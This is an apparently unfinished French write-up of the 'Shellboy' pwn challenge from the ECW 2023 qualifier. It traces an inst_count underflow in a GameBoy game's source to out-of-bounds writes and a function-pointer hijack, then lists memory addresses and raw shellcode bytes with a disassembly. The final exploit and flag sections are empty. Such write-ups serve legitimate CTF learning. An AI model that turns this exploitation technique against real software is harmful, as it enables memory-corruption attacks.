---
title: "[ECW 2023] - Shellboy"
subtitle: ""
date: 2023-11-01
draft: true
author: "LelBy"
description: ""
images: []

tags: ["ECW", "Write-up", "Gameboy"]
categories: ["Pwn"]

featuredImage: ""
featuredImagePreview: ""
---

## Introduction

Ce challenge provient de la phase de qualification de l'ECW 2023.

Shellboy est un challenge de pwn se jouant sur un émulateur de GameBoy (WASMBoy). Les ressources données sont :
- Le code source
- La cartouche compilée
- Une API Web pour interagir avec l'instance distante 

![](images/ECW-2023/shellboy_main.png)

## Premiers pas

Dans ce jeu, nous pouvons définir une liste d'instruction permettant à notre petit personnage de se déplacer de haut en bas et de droite à gauche. En effet, il est possible :

- De naviguer dans la liste d'instruction avec `left` et `right`
- D'ajouter une instruction avec la touche `A` et son type avec les flèches directionnelles (`up`, `down`, `left`, `right`)
- De supprimer une instruction (et ses répétitions) avec le bouton `B`
- De préciser le nombre d'instruction du même type avec les touches directionnelles `up` et `down` jusqu'à 255
- De fusionner ou de bouger deux instructions entre elles en appuyant sur `select` pour la première et `select` pour la seconde. Si les deux instructions sont de même type, alors elles seront fusionnées (addition de leur répétition). Si elles sont différentes, elles changeront de place dans la liste.
- De lancer la simulation avec le bouton `start`

![](images/ECW-2023/Pasted%20image%2020231112203458.png)

## Vulnérabilité
- Vulnérabilité lors de la fusion de deux instructions
- Permet de faire un underflow de la variable inst_count et de la rendre à 255 (0xFF)
- Ecriture dans la mémoire entre 0 et 0xFF 

En jouant un petit peut avec le jeu (en appuyant sur toute les touches comme un bourrin :joy:) , je me suis rendu compte d'un comportement anormale avec la fonctionnalité de fusion des instructions.

En effet, j'ai remarqué qu'en fusionnant une instruction avec elle même, un comportement étrange se produit : 

![](images/ECW-2023/Pasted%20image%2020231112205137.png)

Le curseur de sélection n'est pas changé, mais la liste d'instruction diminue tout de même. En répétant le processus un certain nombre de fois, on passe tout a coup de 0 instructions à 255.

![](images/ECW-2023/Pasted%20image%2020231112205306.png)

En effet, il est possible de parcourir plus que 16 cases avec le curseur maintenant. Il est temps de se pencher sur le code source.

Dans le fichier `inst_list.c`, on remarque la fonction `move_inst()` :

```c
void move_inst(uint8_t inst1_index, uint8_t inst2_index)
{
    uint8_t inst1_id = inst_ids[inst1_index];
    uint8_t inst2_id = inst_ids[inst2_index];
    
    ...

    if(inst1_id == inst2_id)
    {
        uint16_t rpt_sum = inst1_rpt + inst2_rpt;
        if(rpt_sum > 255)
        {
            // If the sum of repetitions is more than a stack (255),
            // we fill the first stack to the maximum and put the rest in the second
            inst_rpt[inst1_index] = 255;
            inst_rpt[inst2_index] = rpt_sum - 255;
        }
        else
        {
            // If the sum of repetitions is less than a stack (255),
            // we merge all in the first stack and delete the second
            inst_rpt[inst1_index] = rpt_sum;
            remove_inst(inst2_index);
        }
    }
    // Second case. IDs are differents, so we swap instructions
    else
    {
        ...
    }
}
```

On remarque dans ce code, que lorsque deux instructions sont de même type, et que la somme de leur stack est inférieur à 255, alors on supprime la deuxième stack d'instructions. Or, dans notre cas, les instructions sont les même ! 

```c
void remove_inst(uint8_t inst_index)
{
    if(inst_index + 1 != inst_count)
    {
        // Shift all following instructions in the instruction list
        for(uint8_t i = 0, j = 0; i < MAX_INST && j < MAX_INST; i++, j++)
        {
            if(i == inst_index)
            {
                j++;
            }
            inst_ids[i] = inst_ids[j];
            inst_rpt[i] = inst_rpt[j];
        }
    }
    inst_count--;
}
```

Lorsque la stack d'instruction est supprimée, la variable globale `inst_count` est décrémentée. Mais ce n'est pas tout !

```c
...
	
// Remove the selected instruction
else if(KEY_TRIGGERED(J_B) && !list_empty)
{
	remove_inst(inst_cursor_pos);
	list_empty = inst_count == 0;
	inst_cursor_pos = 0;
}

...
	
// Swap/Merge the selected instruction
else if(KEY_TRIGGERED(J_SELECT) && !list_empty)
{
	if(is_moving_inst)
	{
		move_inst(inst_cursor_pos, selected_index);
		is_moving_inst = false;
	}
	else
	{
		selected_index = inst_cursor_pos;
		is_moving_inst = true;
	}
```

Lorsqu'on supprime normalement une instruction  avec la touche `B`, la variable `inst_cusror_pos` est remise à `0`. Si  `inst_count = 0`, alors `list_empty` devient `True`. 

Cependant, dans notre cas, on remarque que la fonction `move_inst()` est appelée sans que `inst_count` ne soit vérifiée et `inst_cursor_pos` réinitialisée. Ce qui permet de pouvoir décrémenter `inst_count` et l'underflow pour la faire passer à `255`.

```c
// Select next instruction
else if(KEY_TRIGGERED(J_RIGHT))
{
	inst_cursor_pos += (inst_cursor_pos < inst_count - 1) ? 1 : 0;
}
// Increase instruction repetition
else if(KEY_TRIGGERED(J_UP) && !list_empty)
{
	inst_rpt[inst_cursor_pos] += (inst_rpt[inst_cursor_pos] < 255) ? 1 : 2;
}

```

De plus, on observe que la variable `inst_cursor_pos` est utilisé pour accéder aux valeurs contenues dans le tableau `inst_rpt[]`.

Ce tableau contient des valeurs comprises entre `0` et `255`, correspondant au nombre de répétition de chaque instruction. En parallèle, le tableau `inst_ids[]`, contient le type d'instruction. 

Dans un cas normal, ces tableaux ont une taille maximale de 16. Cependant, la variable `inst_cursor_pos` est comprise entre `0` et `inst_count` Si `inst_count` est supérieure à `16`, alors nous avons une OOB (Out-of-Bound) sur le tableau `inst_rpt[]` et `inst_ids[]`.

### Ecriture arbitraire

Grâce à l'observation précédente, il est ainsi possible d'écrire des valeurs comprises entre `0` et `255` dans la mémoire, dans un espace compris entre le début de `inst_rpt` et `inst_rpt + 255`. 

Il va être ainsi nécessaire de déterminer le mapping des variables en mémoire.

### Représentation de la mémoire
- Représentation de la mémoire 



## Execution de code
- Ecriture en exploitant l'ID du type d'instruction pour décaler le pointeur de fonction

### Payload
- Shellcode

## Code finale
- Code python d'exploitation

## Flag




















Possibilité de décrémenter `inst_count` pour la faire passer à 255, en faisant un select d'un index avec lui même

`0xC0B9 to 0xC0C8`  --> inst_rpt[]
`0xC0C9 to 0xC0D8 ` --> inst_ids[]
`0xC0D9` --> inst_count
`0xC0DA` --> inst_cursor_pos
`0xC0DB` --> selected_index
`0xC0E1` --> bot_x
`0xC0E2` --> bot_y
`0xC0E3` --> curr_keys
`0xC0E4` --> prev_keys

`0x139A` --> inst_funcs --> JP (HL)

`0xC0B1` --> inst_funcs --> tableau de pointeurs de fonction

Idée : Ecrire aux alentours de C0D0 pour controler la valeur que HL aura, soit H et L

L'ID de la case peut être ``0x09`` par exemple, ce qui permet de récupérer notre pointeur custom à `0xC0C3`, car `0xC0B1 + 0x09*2` = `0xC0C3`, ou j'écris un pointeur vers mon shellcode.

`0xC0B1 + 0x4*2 = 0xC0B9` --> inst_rpt[] --> On écrit `0xC0BB` qui pointe vers inst_rpt[2] (début du shellcode)

Il y a un tableau de 4 pointeurs. cest pointeurs pointent vers les 4 fonctions de mouvement du bot. 
En changeant l'id de la case, le programme va récupérer un pointeur qui est dans une zone de mémoire plus lointaine que celle initiale.
Et cela tombe dans une zone de mémoire que on controle. Donc on change le pointeur vers une autre zone de mémoire ou on va placer notre shellcode !


On décrémente `inst_count` pour qu'elle soit à `0xFF`
On écrit dans inst_rpt[0] = 0xBB et inst_rpt[1] = 0xC0 ce qui permettra de `JMP (HL) avec HL = 0xC0BB`
On écrit dans inst_ids[0] = 0x4, permet de load HL avec la valeur contenue dans `0xC0B9`

Besoins de JMP relatif pour sauter dans la deuxième partie du shellcode.

Payload : BBC0 

```
11 FA 06 : LD DE, 0x06FA
d5       : PUSH DE
21 04 12 : LD HL, 0x1204
e5       : PUSH HL
3e 01    : LD A, 0x1
f5       : PUSH AF
33       : INC SP
cd c0 10 : CALL bnprintf
E8 05    : ADD SP+5
11 d0 F7 : LD DE, 0x7d0
cd 9b 13 : CALL delay

```

BB C0 11 FA 06 D5 21 04 12 E5 3E 01 F5 33 00 00 04 CD C0 10 E8 05 11 D0 F7 CD 9B 13

```
        LAB_ram_0ea6                                    XREF[1]:     ram:0e8b (j)   
        ram:0ea6 11  ec  0e      LD         DE,0xeec
        ram:0ea9 d5              PUSH       DE=>s_Failed._Try_again._ram_0eec                = "Failed. Try again."
        ram:0eaa 21  04  12      LD         HL,0x1204
        ram:0ead e5              PUSH       HL=>LAB_ram_1204
        ram:0eae 3e  01          LD         A,0x1
        ram:0eb0 f5              PUSH       AF
        ram:0eb1 33              INC        SP
        ram:0eb2 cd  c0  10      CALL       bnprintf                                         undefined bnprintf(void)
                E8 05                        ADD SP+5
        ram:0eb7 11  d0  07       LD         DE,0x7d0
        ram:0eba cd  9b  13       CALL       delay                                            undefined delay(short param_1)
```
